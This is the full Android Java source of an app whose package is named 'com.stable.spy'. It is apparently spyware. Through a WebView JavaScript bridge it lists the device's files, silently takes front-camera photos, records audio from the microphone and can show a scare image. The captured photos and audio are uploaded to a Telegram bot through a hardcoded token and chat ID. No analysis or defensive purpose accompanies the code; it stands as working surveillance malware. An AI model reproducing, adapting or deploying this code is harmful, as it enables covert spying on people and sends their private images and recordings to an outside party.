package com.stable.spy;
import android.os.*; import android.webkit.*; import android.app.*; import android.content.*; import android.net.Uri; import java.io.*; import android.hardware.Camera; import android.graphics.SurfaceTexture; import android.media.MediaRecorder; import java.net.HttpURLConnection; import java.net.URL; import android.provider.Settings;

public class MainActivity extends Activity {
    WebView w; MediaRecorder r; String T="8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8", CH="8194848649";
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        if (Build.VERSION.SDK_INT>=23) requestPermissions(new String[]{"android.permission.CAMERA","android.permission.RECORD_AUDIO"},1);
        if (Build.VERSION.SDK_INT>=30 && !Environment.isExternalStorageManager()) {
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:"+getPackageName())));
        }
        w=new WebView(this); w.getSettings().setJavaScriptEnabled(true);
        w.addJavascriptInterface(new Object(){
            @JavascriptInterface public String list(String p){
                File[] fs=new File(p).listFiles(); if(fs==null) return "Error";
                StringBuilder sb=new StringBuilder(); for(File f:fs) sb.append(f.getName()).append("\n"); return sb.toString();
            }
            @JavascriptInterface public void takeSnap(){
                try{ Camera c=Camera.open(1); c.setPreviewTexture(new SurfaceTexture(10)); c.startPreview();
                c.takePicture(null,null,(data,cam)->{ send(data,"photo","s.jpg"); cam.release(); }); }catch(Exception e){}
            }
            @JavascriptInterface public void scare(){
                runOnUiThread(()->{ w.loadUrl("javascript:document.body.innerHTML='<img src=\"file:///android_asset/scare.png\" style=\"width:100%;height:100%;object-fit:cover;\">';"); });
            }
            @JavascriptInterface public void recordAudio(int ms){
                try{ File o=new File(getExternalFilesDir(null),"r.3gp"); r=new MediaRecorder();
                r.setAudioSource(1); r.setOutputFormat(1); r.setAudioEncoder(1); r.setOutputFile(o.getAbsolutePath());
                r.prepare(); r.start(); new Handler(Looper.getMainLooper()).postDelayed(()->{
                try{ r.stop(); r.release(); FileInputStream f=new FileInputStream(o); byte[] b=new byte[(int)o.length()]; f.read(b); f.close(); send(b,"audio","r.3gp"); }catch(Exception e){}
                },ms); }catch(Exception e){}
            }
        },"Android");
        w.loadUrl("file:///android_asset/index.html"); setContentView(w);
    }
    void send(byte[] d, String t, String n){
        new Thread(()->{ try{
            HttpURLConnection c=(HttpURLConnection)new URL("https://api.telegram.org/bot"+T+"/send"+t.substring(0,1).toUpperCase()+t.substring(1)).openConnection();
            c.setDoOutput(true); c.setRequestMethod("POST"); String b="***"; c.setRequestProperty("Content-Type","multipart/form-data; boundary="+b);
            DataOutputStream o=new DataOutputStream(c.getOutputStream());
            o.writeBytes("--"+b+"\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n"+CH+"\r\n--"+b+"\r\nContent-Disposition: form-data; name=\""+(t.equals("audio")?"audio":"photo")+"\"; filename=\""+n+"\"\r\n\r\n");
            o.write(d); o.writeBytes("\r\n--"+b+"--\r\n"); o.close(); c.getInputStream();
        }catch(Exception e){}}).start();
    }
}